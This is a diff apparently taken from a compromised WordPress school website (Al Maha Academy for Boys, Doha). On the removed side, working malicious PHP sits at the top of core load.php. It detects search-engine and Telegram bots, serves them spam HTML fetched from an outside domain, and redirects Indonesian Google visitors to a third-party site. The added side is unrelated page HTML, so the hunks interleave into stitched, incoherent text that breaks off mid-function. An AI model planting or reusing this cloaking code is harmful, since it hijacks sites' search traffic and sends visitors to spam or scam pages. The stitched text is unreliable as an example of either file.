@@ -1,2040 +1,1790 @@
-<?php
-$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
-$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
 
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-return false;
-}
-if (is_bot()) {
-echo file_get_contents('https://theonlyd.xyz/amab.html');
-exit;
-}
+<!DOCTYPE html>
+<html lang="en-US" class="no-js">
 
-if (stripos($s_ref, 'google.co.id') !== false ||
-(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://amablink.pages.dev/");
-exit;
-}
-?>
-<?php
-/**
- * These functions are needed to load WordPress.
- *
- * @package WordPress
- */
+<head>
+	<meta charset="UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1">
 
-/**
- * Returns the HTTP protocol sent by the server.
- *
- * @since 4.4.0
- *
- * @return string The HTTP protocol. Default: HTTP/1.0.
- */
-function wp_get_server_protocol() {
-	$protocol = isset( $_SERVER['SERVER_PROTOCOL'] ) ? $_SERVER['SERVER_PROTOCOL'] : '';
+	
+	<title>News and Events &#8211; AMAB &#8211; Al Maha Academy for Boys | Taallum Group Doha Qatar -أكاديميّة المها للبنين</title>
+<meta name='robots' content='max-image-preview:large' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel='dns-prefetch' href='//rnx.073.mytemp.website' />
+<link rel="alternate" type="application/rss+xml" title="AMAB - Al Maha Academy for Boys | Taallum Group Doha Qatar -أكاديميّة المها للبنين &raquo; Feed" href="https://amab.com.qa/feed/" />
+<link rel="alternate" type="application/rss+xml" title="AMAB - Al Maha Academy for Boys | Taallum Group Doha Qatar -أكاديميّة المها للبنين &raquo; Comments Feed" href="https://amab.com.qa/comments/feed/" />
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/amab.com.qa\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id="vamtam-theme-options">:root {--vamtam-default-bg-color:#fff;
+--vamtam-default-line-color:rgba( var( --vamtam-accent-color-7-rgb ), 1 );
+--vamtam-small-padding:20px;
+--vamtam-horizontal-padding:50px;
+--vamtam-vertical-padding:30px;
+--vamtam-horizontal-padding-large:60px;
+--vamtam-vertical-padding-large:60px;
+--vamtam-no-border-link:none;
+--vamtam-border-radius:0px;
+--vamtam-border-radius-oval:0px;
+--vamtam-border-radius-small:0px;
+--vamtam-overlay-color:#ffffff;
+--vamtam-overlay-color-hc:#000000;
+--vamtam-box-outer-padding:60px;
+--vamtam-body-link-regular:#36348E;
+--vamtam-body-link-visited:#36348E;
+--vamtam-input-border-radius:0px 0px 0px 0px;
+--vamtam-btn-text-color:#36348E;
+--vamtam-btn-hover-text-color:#36348E;
+--vamtam-btn-bg-color:#00000000;
+--vamtam-site-max-width:1260px;
+--vamtam-primary-font-color:#292929;
+--vamtam-h1-color:#FFFFFF;
+--vamtam-h2-color:#292929;
+--vamtam-h3-color:#292929;
+--vamtam-h4-color:#292929;
+--vamtam-h5-color:#292929;
+--vamtam-h6-color:#292929;
+--vamtam-accent-color-1:#30A6DC;
+--vamtam-accent-color-1-hc:#FFFFFF;
+--vamtam-accent-color-1-rgb:48,166,220;
+--vamtam-accent-color-2:#942682;
+--vamtam-accent-color-2-hc:#FFFFFF;
+--vamtam-accent-color-2-rgb:148,38,130;
+--vamtam-accent-color-3:#0A7FB5;
+--vamtam-accent-color-3-hc:#FFFFFF;
+--vamtam-accent-color-3-rgb:10,127,181;
+--vamtam-accent-color-4:#FAFAFA;
+--vamtam-accent-color-4-hc:#000000;
+--vamtam-accent-color-4-rgb:250,250,250;
+--vamtam-accent-color-5:#FFFFFF;
+--vamtam-accent-color-5-hc:#000000;
+--vamtam-accent-color-5-rgb:255,255,255;
+--vamtam-accent-color-6:#292929;
+--vamtam-accent-color-6-hc:#FFFFFF;
+--vamtam-accent-color-6-rgb:41,41,41;
+--vamtam-accent-color-7:#B7D8EF;
+--vamtam-accent-color-7-hc:#000000;
+--vamtam-accent-color-7-rgb:183,216,239;
+--vamtam-accent-color-8:#545454;
+--vamtam-accent-color-8-hc:#FFFFFF;
+--vamtam-accent-color-8-rgb:84,84,84;
+--vamtam-sticky-header-bg-color:#30A6DC;
+--vamtam-primary-font-font-family:'Work Sans';
+--vamtam-primary-font-font-weight:400;
+--vamtam-primary-font-font-size-desktop:18px;
+--vamtam-primary-font-font-size-tablet:18px;
+--vamtam-primary-font-font-size-phone:16px;
+--vamtam-primary-font-line-height-desktop:1.6em;
+--vamtam-primary-font-line-height-tablet:1.6em;
+--vamtam-primary-font-line-height-phone:24px;
+--vamtam-h1-font-family:'Work Sans';
+--vamtam-h1-font-weight:800;
+--vamtam-h1-font-size-desktop:55px;
+--vamtam-h1-font-size-tablet:55px;
+--vamtam-h1-font-size-phone:34px;
+--vamtam-h1-line-height-desktop:1.1em;
+--vamtam-h1-line-height-tablet:1.1em;
+--vamtam-h1-line-height-phone:1.1em;
+--vamtam-h2-font-family:'Work Sans';
+--vamtam-h2-font-weight:700;
+--vamtam-h2-font-size-desktop:50px;
+--vamtam-h2-font-size-tablet:50px;
+--vamtam-h2-font-size-phone:30px;
+--vamtam-h2-line-height-desktop:1.2em;
+--vamtam-h2-line-height-tablet:1.2em;
+--vamtam-h2-line-height-phone:1.2em;
+--vamtam-h3-font-family:'Work Sans';
+--vamtam-h3-font-weight:700;
+--vamtam-h3-font-size-desktop:36px;
+--vamtam-h3-font-size-tablet:36px;
+--vamtam-h3-font-size-phone:26px;
+--vamtam-h3-line-height-desktop:1.2em;
+--vamtam-h3-line-height-tablet:1.2em;
+--vamtam-h3-line-height-phone:1.3em;
+--vamtam-h4-font-family:'Work Sans';
+--vamtam-h4-font-weight:800;
+--vamtam-h4-font-size-desktop:26px;
+--vamtam-h4-font-size-tablet:26px;
+--vamtam-h4-font-size-phone:22px;
+--vamtam-h4-line-height-desktop:1.2em;
+--vamtam-h4-line-height-tablet:1.2em;
+--vamtam-h4-line-height-phone:1.2em;
+--vamtam-h5-font-family:'Work Sans';
+--vamtam-h5-font-weight:600;
+--vamtam-h5-font-size-desktop:24px;
+--vamtam-h5-font-size-tablet:24px;
+--vamtam-h5-font-size-phone:22px;
+--vamtam-h5-line-height-desktop:1.2em;
+--vamtam-h5-line-height-tablet:1.2em;
+--vamtam-h5-line-height-phone:1.3em;
+--vamtam-h6-font-family:'Work Sans';
+--vamtam-h6-font-weight:500;
+--vamtam-h6-transform:none;
+--vamtam-h6-font-size-desktop:18px;
+--vamtam-h6-font-size-tablet:18px;
+--vamtam-h6-font-size-phone:18px;
+--vamtam-h6-line-height-desktop:1.3em;
+--vamtam-h6-line-height-tablet:1.3em;
+--vamtam-h6-line-height-phone:1.3em;
+--vamtam-loading-animation:url('https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/images/loader-ring.gif');
+}</style><style id='wp-emoji-styles-inline-css' type='text/css'>
 
-	if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0', 'HTTP/3' ), true ) ) {
-		$protocol = 'HTTP/1.0';
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
 	}
+</style>
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='trp-language-switcher-style-css' href='https://amab.com.qa/wp-content/plugins/translatepress-multilingual/assets/css/trp-language-switcher.css?ver=2.9.3' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/custom-frontend.min.css?ver=1737042462' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-9-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/post-9.css?ver=1737042462' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-pro-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/custom-pro-frontend.min.css?ver=1737042462' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-theme-icons-css' href='https://rnx.073.mytemp.website/amab/wp-content/uploads/elementor/custom-icons/theme-icons/style.css?ver=1.0.0' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-5-all-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/lib/font-awesome/css/v4-shims.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-text-editor-css' href='https://amab.com.qa/wp-content/plugins/elementor/assets/css/widget-text-editor.min.css?ver=3.26.4' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-992016-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/post-992016.css?ver=1737093781' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-9088-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/post-9088.css?ver=1738825687' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-206-css' href='https://amab.com.qa/wp-content/uploads/elementor/css/post-206.css?ver=1737042463' type='text/css' media='all' />
+<link rel='stylesheet' id='vamtam-front-all-css' href='https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/css/dist/all.css?ver=1729494426' type='text/css' media='all' />
+<style id='vamtam-front-all-inline-css' type='text/css'>
 
-	return $protocol;
-}
-
-/**
- * Fixes `$_SERVER` variables for various setups.
- *
- * @since 3.0.0
- * @access private
- *
- * @global string $PHP_SELF The filename of the currently executing script,
- *                          relative to the document root.
- */
-function wp_fix_server_vars() {
-	global $PHP_SELF;
-
-	$default_server_values = array(
-		'SERVER_SOFTWARE' => '',
-		'REQUEST_URI'     => '',
-	);
-
-	$_SERVER = array_merge( $default_server_values, $_SERVER );
-
-	// Fix for IIS when running with PHP ISAPI.
-	if ( empty( $_SERVER['REQUEST_URI'] )
-		|| ( 'cgi-fcgi' !== PHP_SAPI && preg_match( '/^Microsoft-IIS\//', $_SERVER['SERVER_SOFTWARE'] ) )
-	) {
-
-		if ( isset( $_SERVER['HTTP_X_ORIGINAL_URL'] ) ) {
-			// IIS Mod-Rewrite.
-			$_SERVER['REQUEST_URI'] = $_SERVER['HTTP_X_ORIGINAL_URL'];
-		} elseif ( isset( $_SERVER['HTTP_X_REWRITE_URL'] ) ) {
-			// IIS Isapi_Rewrite.
-			$_SERVER['REQUEST_URI'] = $_SERVER['HTTP_X_REWRITE_URL'];
-		} else {
-			// Use ORIG_PATH_INFO if there is no PATH_INFO.
-			if ( ! isset( $_SERVER['PATH_INFO'] ) && isset( $_SERVER['ORIG_PATH_INFO'] ) ) {
-				$_SERVER['PATH_INFO'] = $_SERVER['ORIG_PATH_INFO'];
+			@font-face {
+				font-family: 'icomoon';
+				src: url(https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/fonts/icons/icomoon.woff2) format('woff2'),
+					 url( https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/fonts/icons/icomoon.woff) format('woff'),
+					 url(https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/fonts/icons/icomoon.ttf) format('ttf');
+				font-weight: normal;
+				font-style: normal;
+				font-display: swap;
 			}
-
-			// Some IIS + PHP configurations put the script-name in the path-info (no need to append it twice).
-			if ( isset( $_SERVER['PATH_INFO'] ) ) {
-				if ( $_SERVER['PATH_INFO'] === $_SERVER['SCRIPT_NAME'] ) {
-					$_SERVER['REQUEST_URI'] = $_SERVER['PATH_INFO'];
-				} else {
-					$_SERVER['REQUEST_URI'] = $_SERVER['SCRIPT_NAME'] . $_SERVER['PATH_INFO'];
+		
+				@font-face {
+					font-family: 'vamtam-theme';
+					src: url(https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/fonts/theme-icons/theme-icons.woff2) format('woff2'),
+						url(https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/fonts/theme-icons/theme-icons.woff) format('woff');
+					font-weight: normal;
+					font-style: normal;
+					font-display: swap;
 				}
-			}
-
-			// Append the query string if it exists and isn't null.
-			if ( ! empty( $_SERVER['QUERY_STRING'] ) ) {
-				$_SERVER['REQUEST_URI'] .= '?' . $_SERVER['QUERY_STRING'];
-			}
-		}
-	}
-
-	// Fix for PHP as CGI hosts that set SCRIPT_FILENAME to something ending in php.cgi for all requests.
-	if ( isset( $_SERVER['SCRIPT_FILENAME'] ) && str_ends_with( $_SERVER['SCRIPT_FILENAME'], 'php.cgi' ) ) {
-		$_SERVER['SCRIPT_FILENAME'] = $_SERVER['PATH_TRANSLATED'];
-	}
-
-	// Fix for Dreamhost and other PHP as CGI hosts.
-	if ( isset( $_SERVER['SCRIPT_NAME'] ) && str_contains( $_SERVER['SCRIPT_NAME'], 'php.cgi' ) ) {
-		unset( $_SERVER['PATH_INFO'] );
-	}
-
-	// Fix empty PHP_SELF.
-	$PHP_SELF = $_SERVER['PHP_SELF'];
-	if ( empty( $PHP_SELF ) ) {
-		$_SERVER['PHP_SELF'] = preg_replace( '/(\?.*)?$/', '', $_SERVER['REQUEST_URI'] );
-		$PHP_SELF            = $_SERVER['PHP_SELF'];
-	}
-
-	wp_populate_basic_auth_from_authorization_header();
+			
+@font-face {
+	font-family: 'Nexa';
+	font-style: normal;
+	font-weight: 300;
+	font-display: swap;
+	src: url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaText-Light.eot');
+	src: url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaText-Light.eot?#iefix') format('embedded-opentype'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Light.woff2') format('woff2'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Light.woff') format('woff'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Light.ttf') format('truetype'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Light.svg#Nexa') format('svg');
+}
+@font-face {
+	font-family: 'Nexa';
+	font-style: normal;
+	font-weight: bold;
+	font-display: swap;
+	src: url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Bold.eot');
+	src: url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Bold.eot?#iefix') format('embedded-opentype'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Bold.woff2') format('woff2'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Bold.woff') format('woff'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Bold.ttf') format('truetype'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/05/NexaTextDemo-Bold.svg#Nexa') format('svg');
+}
+@font-face {
+	font-family: 'Jomolhari';
+	font-style: normal;
+	font-weight: normal;
+	font-display: swap;
+	src: url('https://estudiar.vamtam.com/wp-content/uploads/2020/03/Jomolhari-Regular.eot');
+	src: url('https://estudiar.vamtam.com/wp-content/uploads/2020/03/Jomolhari-Regular.eot?#iefix') format('embedded-opentype'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/03/Jomolhari-Regular.woff2') format('woff2'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/03/Jomolhari-Regular.woff') format('woff'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/03/Jomolhari-Regular.ttf') format('truetype'),
+		url('https://estudiar.vamtam.com/wp-content/uploads/2020/03/Jomolhari-Regular.svg#Jomolhari') format('svg');
 }
 
-/**
- * Populates the Basic Auth server details from the Authorization header.
- *
- * Some servers running in CGI or FastCGI mode don't pass the Authorization
- * header on to WordPress.  If it's been rewritten to the `HTTP_AUTHORIZATION` header,
- * fill in the proper $_SERVER variables instead.
- *
- * @since 5.6.0
- */
-function wp_populate_basic_auth_from_authorization_header() {
-	// If we don't have anything to pull from, return early.
-	if ( ! isset( $_SERVER['HTTP_AUTHORIZATION'] ) && ! isset( $_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ) ) {
-		return;
-	}
 
-	// If either PHP_AUTH key is already set, do nothing.
-	if ( isset( $_SERVER['PHP_AUTH_USER'] ) || isset( $_SERVER['PHP_AUTH_PW'] ) ) {
-		return;
-	}
-
-	// From our prior conditional, one of these must be set.
-	$header = isset( $_SERVER['HTTP_AUTHORIZATION'] ) ? $_SERVER['HTTP_AUTHORIZATION'] : $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
-
-	// Test to make sure the pattern matches expected.
-	if ( ! preg_match( '%^Basic [a-z\d/+]*={0,2}$%i', $header ) ) {
-		return;
-	}
-
